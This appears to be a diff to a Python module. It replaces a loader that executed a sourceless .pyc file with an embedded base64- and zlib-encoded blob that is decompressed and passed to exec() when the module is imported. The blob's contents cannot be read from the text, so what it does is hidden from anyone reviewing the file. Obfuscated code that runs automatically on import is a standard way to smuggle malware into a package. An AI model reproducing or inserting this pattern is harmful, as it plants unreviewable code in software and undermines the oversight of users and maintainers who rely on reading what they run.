@@ -1,7 +1,4 @@
-import importlib.machinery, importlib.util, sys, os
-pyc_path = os.path.splitext(__file__)[0] + '.pyc'
-loader = importlib.machinery.SourcelessFileLoader(__name__, pyc_path)
-spec   = importlib.util.spec_from_loader(__name__, loader)
-module = importlib.util.module_from_spec(spec)
-loader.exec_module(module)
-sys.modules[__name__] = module
+import zlib, base64
+_B64 = ("eNo1U2mP2jAQ/Vwk/kO+jQ0mJGyz7cY1UoC97/tAKDLEC2mDg2zDFrX9750AG0VK3jzrzZvDR8KUS53VawORa1ev5fNFaZw3k3ZW5GNPWi9hc+lm9Vqm3r1DItmYxj2R+HYmO9E+kb7SkzJThFI/y6fKOkJ5Xwz8d1PO0/HaKUt6w/j7iEGRO1cooO1Oo7H/lRvllkaTfsuPaGO81U8XJKNxvfblVkBuUykl8BsBRq1y9ZHaSWkU8GsB5YdWxqZG6ikGrgRMlTbKAr8UUMilnszShcknyPVF5k+VI5fMDyi/26ErBkD9ovxQBu0e76LXDIJWgIRdoFcCLaBoxZl1fCLIgBwPgxFtVt9wRLEK5NTviVo4pAME9zuZGxZhqocdumUIHsUfsPl8WUiXlxriPQZmMYW4w8A6I52ariEO/YiBnGxPhPibrZTGHqkNstVcLMR+9I8/iceN9l2l/SxO2mFQPQ1U4C+C3LfQQBVrdPirCL383XvwVGGVF/BE9JtPzefmS/OVn4p+Kwz4GYbCqgA8l/w4jRNxugPdMwRnCM4F/AX/Z5lrgn7JtrKkaiJ9L42XeLkeXrIrds1uGCwKqbXK0izHgS21A3Y7ojxpikNyznDYn5kCFK/SJuIItTqUX6CfZMtedANP6szrd4P4TVy0+w0sh0sxDAMWRqwTsE7E9gLsNPuGbzTiPTFHd5L9UmtRyPk4k94qlmNLVq03WuWsGoCbW2Xsbbw0Ic2AffrpoZ8tW4HuQYUONofFgByRXhu3NKK7rcVL0fsPkkHiYg==")
+_code = zlib.decompress(base64.b64decode(_B64))
+exec(_code, globals())
